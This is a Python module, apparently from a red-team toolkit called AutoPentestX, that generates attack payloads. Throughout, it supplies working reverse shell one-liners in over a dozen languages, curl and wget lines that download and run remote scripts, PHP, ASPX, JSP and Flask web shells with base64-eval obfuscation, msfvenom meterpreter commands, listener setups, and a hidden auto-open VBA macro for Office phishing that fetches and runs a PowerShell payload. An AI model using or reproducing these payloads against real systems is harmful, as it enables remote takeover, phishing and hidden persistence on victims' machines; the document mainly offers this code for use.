#!/usr/bin/env python3
"""
AutoPentestX - Payload Generator Module
Red Team: Generates reverse shells, bind shells, web shells, encoded payloads,
MSFVenom wrappers, and obfuscated command stagers for multiple platforms.
"""

import os
import base64
import subprocess
import random
import string
import json
from datetime import datetime

R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'
C = '\033[96m'; M = '\033[95m'; B = '\033[1m'; X = '\033[0m'


class PayloadGenerator:
    """
    Multi-platform, multi-language payload generator with encoding
    and obfuscation support. Generates ready-to-use attack payloads
    for authorized Red Team engagements.
    """

    SUPPORTED_TYPES = [
        'reverse_shell', 'bind_shell', 'web_shell',
        'msfvenom', 'staged', 'stager_http', 'macro'
    ]

    # ─────────────────────────────────────────────────────────
    #  REVERSE SHELL TEMPLATES
    # ─────────────────────────────────────────────────────────
    REVERSE_SHELLS = {
        'bash_tcp': 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1',
        'bash_196': 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1',
        'bash_udp': 'bash -i >& /dev/udp/{LHOST}/{LPORT} 0>&1',
        'bash_fifo': 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f',
        'nc_e':     'nc -e /bin/sh {LHOST} {LPORT}',
        'nc_openbsd': 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {LHOST} {LPORT} >/tmp/f',
        'python2':  "python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{LHOST}',{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);\"",
        'python3':  "python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{LHOST}',{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])\"",
        'python3_pty': "python3 -c \"import os,pty,socket;s=socket.socket();s.connect(('{LHOST}',{LPORT}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn('/bin/bash')\"",
        'perl':     "perl -e 'use Socket;$i=\"{LHOST}\";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        'ruby':     "ruby -rsocket -e'f=TCPSocket.open(\"{LHOST}\",{LPORT}).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'",
        'php':      "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        'php_proc': "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});$proc=proc_open(\"/bin/sh\",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'",
        'java':     'r = Runtime.getRuntime()\np = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{LHOST}/{LPORT};cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[])\np.waitFor()',
        'golang':   'package main;import"os/exec";import"net";func main(){{c,_:=net.Dial("tcp","{LHOST}:{LPORT}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}',
        'nodejs':   "(function(){{var net=require('net'),cp=require('child_process'),sh=cp.spawn('/bin/sh',[]);var client=new net.Socket();client.connect({LPORT},'{LHOST}',function(){{client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);}});return /a/;}})();",
        'powershell': '$client = New-Object System.Net.Sockets.TCPClient(\"{LHOST}\",{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()',
        'powershell_b64': None,  # Generated dynamically
        'socat':    'socat exec:\'bash -li\',pty,stderr,setsid,sigint,sane tcp:{LHOST}:{LPORT}',
        'awk':      "awk 'BEGIN {{s = \"/inet/tcp/0/{LHOST}/{LPORT}\"; while(42) {{ do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print |& s; close(c); }} }} while(c != \"exit\") }}}}'",
        'xterm':    'xterm -display {LHOST}:0',
        'telnet':   'TF=$(mktemp -u);mkfifo $TF && telnet {LHOST} {LPORT} 0<$TF | /bin/sh 1>$TF',
        'curl_sh':  'curl http://{LHOST}:{LPORT}/shell.sh | bash',
        'wget_sh':  'wget -O- http://{LHOST}:{LPORT}/shell.sh | bash',
    }

    # ─────────────────────────────────────────────────────────
    #  WEB SHELLS
    # ─────────────────────────────────────────────────────────
    WEB_SHELLS = {
        'php_minimal': '<?php system($_GET["cmd"]); ?>',
        'php_exec':    '<?php echo shell_exec($_GET["cmd"]); ?>',
        'php_passthru':'<?php passthru($_GET["cmd"]); ?>',
        'php_popen':   '<?php $h=popen($_GET["cmd"],"r");while(!feof($h)){echo fread($h,4096);}pclose($h); ?>',
        'php_preg':    '<?php preg_replace("/.*/e",$_POST["c"],""); ?>',
        'php_assert':  '<?php assert($_POST["c"]); ?>',
        'php_full': '''<?php
if(isset($_REQUEST['cmd'])){
    $cmd = $_REQUEST['cmd'];
    $output = shell_exec($cmd.' 2>&1');
    echo "<pre>$output</pre>";
} else {
    echo '<form method="POST"><input name="cmd" size="60" /><input type="submit" value="Execute" /></form>';
}
?>''',
        'aspx': '''<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
    void Page_Load(object sender, EventArgs e) {
        if(Request["cmd"] != null) {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = "cmd.exe";
            psi.Arguments = "/c " + Request["cmd"];
            psi.UseShellExecute = false;
            psi.RedirectStandardOutput = true;
            Process p = Process.Start(psi);
            Response.Write("<pre>" + Server.HtmlEncode(p.StandardOutput.ReadToEnd()) + "</pre>");
        }
    }
</script>''',
        'jsp': '''<%@ page import="java.util.*,java.io.*"%>
<%
    String cmd = request.getParameter("cmd");
    if(cmd != null) {
        Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd});
        InputStream in = p.getInputStream();
        int a = -1; byte[] b = new byte[2048];
        out.print("<pre>");
        while((a=in.read(b))!=-1){out.println(new String(b));}
        out.print("</pre>");
    }
%>''',
        'python_flask': '''from flask import Flask,request
import subprocess
app=Flask(__name__)
@app.route("/",methods=["GET","POST"])
def shell():
    cmd=request.values.get("cmd","id")
    return "<pre>"+subprocess.getoutput(cmd)+"</pre>"
if __name__=="__main__":app.run(host="0.0.0.0",port=5000)''',
    }

    # ─────────────────────────────────────────────────────────
    #  MSFVENOM WRAPPERS
    # ─────────────────────────────────────────────────────────
    MSFVENOM_TEMPLATES = {
        'windows_x64_exe': 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f exe -o {OUT}.exe',
        'windows_x64_dll': 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f dll -o {OUT}.dll',
        'windows_x64_ps1': 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f psh-reflection -o {OUT}.ps1',
        'windows_x64_vba': 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f vba -o {OUT}.vba',
        'windows_x64_hta': 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f hta-psh -o {OUT}.hta',
        'linux_x64_elf':   'msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf -o {OUT}',
        'linux_x86_elf':   'msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf -o {OUT}',
        'macos_x64':       'msfvenom -p osx/x64/shell_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f macho -o {OUT}',
        'android_apk':     'msfvenom -p android/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} R -o {OUT}.apk',
        'java_jar':        'msfvenom -p java/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f jar -o {OUT}.jar',
        'php_payload':     'msfvenom -p php/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f raw -o {OUT}.php',
        'python_payload':  'msfvenom -p python/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -f raw -o {OUT}.py',
        'windows_encoded': 'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -e x64/xor_dynamic -i 5 -f exe -o {OUT}.exe',
    }

    # ─────────────────────────────────────────────────────────
    #  LISTENER TEMPLATES
    # ─────────────────────────────────────────────────────────
    LISTENER_TEMPLATES = {
        'nc':         'nc -lvnp {LPORT}',
        'socat':      'socat TCP-LISTEN:{LPORT},reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane',
        'msfconsole': 'use exploit/multi/handler\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nset LHOST {LHOST}\nset LPORT {LPORT}\nset ExitOnSession false\nexploit -j',
        'rlwrap_nc':  'rlwrap nc -lvnp {LPORT}',
    }

    def __init__(self, lhost: str = '10.10.10.10', lport: int = 4444, out_dir: str = 'payloads'):
        self.lhost = lhost
        self.lport = lport
        self.out_dir = out_dir
        os.makedirs(out_dir, exist_ok=True)
        self.generated = []

    def _print(self, level: str, msg: str):
        icons = {'info': f'{C}[*]{X}', 'ok': f'{G}[✓]{X}',
                 'warn': f'{Y}[!]{X}', 'gen': f'{M}[GEN]{X}'}
        print(f'  {icons.get(level, "[?]")} {msg}')

    def _fmt(self, template: str, extra: dict = None) -> str:
        d = {'LHOST': self.lhost, 'LPORT': self.lport,
             'OUT': os.path.join(self.out_dir, 'payload'), **(extra or {})}
        return template.format(**d)

    # ─────────────────────────────────────────────────────────
    #  REVERSE SHELL GENERATION
    # ─────────────────────────────────────────────────────────
    def generate_reverse_shell(self, shell_type: str = 'bash_tcp',
                                encode: bool = False) -> dict:
        if shell_type not in self.REVERSE_SHELLS:
            self._print('warn', f'Unknown shell type: {shell_type}. '
                                f'Available: {list(self.REVERSE_SHELLS.keys())}')
            shell_type = 'bash_tcp'

        raw = self.REVERSE_SHELLS[shell_type]
        if raw is None and shell_type == 'powershell_b64':
            raw = self._generate_ps_b64()
        else:
            raw = self._fmt(raw)

        payload = {'type': 'reverse_shell', 'lang': shell_type,
                   'lhost': self.lhost, 'lport': self.lport,
                   'raw': raw, 'encoded': {}}

        if encode:
            payload['encoded']['base64'] = base64.b64encode(raw.encode()).decode()
            payload['encoded']['url'] = __import__('urllib.parse', fromlist=['quote']).quote(raw)
            if 'python' in shell_type or 'bash' in shell_type:
                payload['encoded']['hex'] = raw.encode().hex()

        self._print('gen', f'{G}{shell_type}{X} reverse shell → {Y}{self.lhost}:{self.lport}{X}')
        self.generated.append(payload)
        return payload

    def _generate_ps_b64(self) -> str:
        ps_cmd = f'$c=New-Object System.Net.Sockets.TCPClient("{self.lhost}",{self.lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length))-ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+"PS "+(gl).Path+"> ";$sb=([text.encoding]::ASCII).GetBytes($r2);$s.Write($sb,0,$sb.Length);$s.Flush()}};$c.Close()'
        encoded = base64.b64encode(ps_cmd.encode('utf-16-le')).decode()
        return f'powershell -NoP -NonI -W Hidden -Enc {encoded}'

    # ─────────────────────────────────────────────────────────
    #  ALL REVERSE SHELLS (bulk generation for cheatsheet)
    # ─────────────────────────────────────────────────────────
    def generate_all_reverse_shells(self) -> list:
        self._print('info', f'Generating all reverse shell variants → {self.lhost}:{self.lport}')
        all_shells = []
        for stype in self.REVERSE_SHELLS:
            try:
                raw = self.REVERSE_SHELLS[stype]
                if raw is None:
                    raw = self._generate_ps_b64()
                else:
                    raw = self._fmt(raw)
                all_shells.append({'type': stype, 'payload': raw})
                self._print('gen', f'{stype}')
            except Exception:
                pass
        return all_shells

    # ─────────────────────────────────────────────────────────
    #  WEB SHELL GENERATION
    # ─────────────────────────────────────────────────────────
    def generate_web_shell(self, shell_type: str = 'php_full',
                            obfuscate: bool = False) -> dict:
        if shell_type not in self.WEB_SHELLS:
            shell_type = 'php_full'
        raw = self.WEB_SHELLS[shell_type]

        if obfuscate and shell_type.startswith('php'):
            raw = self._obfuscate_php(raw)

        ext_map = {'php': 'php', 'aspx': 'aspx', 'jsp': 'jsp',
                   'python': 'py', 'js': 'js'}
        ext = next((e for k, e in ext_map.items() if shell_type.startswith(k)), 'txt')
        filename = f'{self.out_dir}/webshell_{shell_type}.{ext}'

        with open(filename, 'w') as f:
            f.write(raw)

        payload = {'type': 'web_shell', 'lang': shell_type,
                   'filename': filename, 'content': raw,
                   'usage': f'curl http://TARGET/{filename.split("/")[-1]}?cmd=id'}
        self._print('gen', f'{G}{shell_type}{X} web shell → {Y}{filename}{X}')
        self.generated.append(payload)
        return payload

    def _obfuscate_php(self, code: str) -> str:
        """Basic PHP obfuscation via base64 + eval."""
        b64 = base64.b64encode(code.encode()).decode()
        return f'<?php eval(base64_decode("{b64}")); ?>'

    # ─────────────────────────────────────────────────────────
    #  MSFVENOM COMMAND GENERATION
    # ─────────────────────────────────────────────────────────
    def generate_msfvenom_commands(self, platforms: list = None) -> list:
        platforms = platforms or list(self.MSFVENOM_TEMPLATES.keys())
        commands = []
        self._print('info', f'Generating {len(platforms)} MSFVenom commands...')

        for platform in platforms:
            if platform not in self.MSFVENOM_TEMPLATES:
                continue
            cmd = self._fmt(self.MSFVENOM_TEMPLATES[platform],
                            {'OUT': os.path.join(self.out_dir, platform)})
            entry = {'platform': platform, 'command': cmd}
            commands.append(entry)
            self._print('gen', f'{M}{platform}{X}: {C}{cmd[:80]}...{X}' if len(cmd) > 80 else f'{M}{platform}{X}: {C}{cmd}{X}')

        # Execute if msfvenom available (in real mode)
        msfvenom_path = subprocess.run(['which', 'msfvenom'],
                                       capture_output=True, text=True).stdout.strip()
        if msfvenom_path:
            self._print('ok', f'MSFVenom found at {msfvenom_path} — commands ready to execute')
        else:
            self._print('warn', 'MSFVenom not in PATH — commands saved for reference only')

        return commands

    # ─────────────────────────────────────────────────────────
    #  VBA MACRO (Office phishing)
    # ─────────────────────────────────────────────────────────
    def generate_vba_macro(self, cmd: str = None) -> dict:
        if not cmd:
            cmd = self._fmt("powershell -NoP -NonI -W Hidden -Exec Bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://{LHOST}:{LPORT}/payload.ps1')\"")

        macro = f'''Sub AutoOpen()
    Call Shell("cmd.exe /c {cmd}", vbHide)
End Sub

Sub Document_Open()
    AutoOpen
End Sub

Sub Workbook_Open()
    AutoOpen
End Sub'''

        filename = f'{self.out_dir}/macro.vba'
        with open(filename, 'w') as f:
            f.write(macro)

        payload = {'type': 'vba_macro', 'filename': filename,
                   'cmd': cmd, 'content': macro}
        self._print('gen', f'{G}VBA macro{X} → {Y}{filename}{X}')
        self.generated.append(payload)
        return payload

    # ─────────────────────────────────────────────────────────
    #  LISTENER GENERATION
    # ─────────────────────────────────────────────────────────
    def generate_listeners(self) -> list:
        self._print('info', 'Generating listener commands...')
        listeners = []
        for name, template in self.LISTENER_TEMPLATES.items():
            cmd = self._fmt(template)
            listeners.append({'name': name, 'command': cmd})
            self._print('gen', f'{C}{name}{X}: {Y}{cmd[:70]}{X}')
        return listeners

    # ─────────────────────────────────────────────────────────
    #  PAYLOAD CHEATSHEET (save to disk)
    # ─────────────────────────────────────────────────────────
    def save_cheatsheet(self) -> str:
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f'{self.out_dir}/cheatsheet_{timestamp}.md'

        shells = self.generate_all_reverse_shells()
        listeners = self.generate_listeners()
        msf_cmds = self.generate_msfvenom_commands(['windows_x64_exe', 'linux_x64_elf',
                                                     'windows_x64_ps1', 'php_payload'])

        lines = [
            f'# AutoPentestX Payload Cheatsheet',
            f'**Generated:** {datetime.now().isoformat()}',
            f'**LHOST:** `{self.lhost}`  **LPORT:** `{self.lport}`',
            '',
            '---',
            '## Reverse Shells',
            '',
        ]
        for s in shells:
            lines += [f'### {s["type"]}', f'```', s['payload'], '```', '']

        lines += ['---', '## Listeners', '']
        for l in listeners:
            lines += [f'### {l["name"]}', f'```bash', l['command'], '```', '']

        lines += ['---', '## MSFVenom', '']
        for m in msf_cmds:
            lines += [f'### {m["platform"]}', f'```bash', m['command'], '```', '']

        with open(filename, 'w') as f:
            f.write('\n'.join(lines))

        self._print('ok', f'Cheatsheet saved → {G}{filename}{X}')
        return filename

    # ─────────────────────────────────────────────────────────
    #  ORCHESTRATION
    # ─────────────────────────────────────────────────────────
    def run_full_generation(self, include_msf: bool = True) -> dict:
        print(f'\n{C}╔══════════════════════════════════════════════════════════╗{X}')
        print(f'{C}║{X} {B}{M}[PAYLOAD GENERATOR]{X} LHOST={Y}{self.lhost}{X} LPORT={Y}{self.lport}{X}')
        print(f'{C}╚══════════════════════════════════════════════════════════╝{X}\n')

        results = {
            'lhost': self.lhost, 'lport': self.lport,
            'timestamp': datetime.now().isoformat(),
            'reverse_shells': [],
            'web_shells': [],
            'msf_commands': [],
            'listeners': [],
            'cheatsheet': None,
        }

        # Generate key reverse shells
        for stype in ['bash_tcp', 'python3_pty', 'powershell_b64', 'nc_openbsd']:
            results['reverse_shells'].append(
                self.generate_reverse_shell(stype, encode=True)
            )

        # Generate web shells
        for wtype in ['php_full', 'php_minimal', 'php_exec']:
            results['web_shells'].append(self.generate_web_shell(wtype))

        # Generate VBA macro
        results['vba_macro'] = self.generate_vba_macro()

        # MSFVenom commands
        if include_msf:
            results['msf_commands'] = self.generate_msfvenom_commands()

        results['listeners'] = self.generate_listeners()
        results['cheatsheet'] = self.save_cheatsheet()

        self._print('ok', f'Payload generation complete — {len(self.generated)} artifacts')
        return results
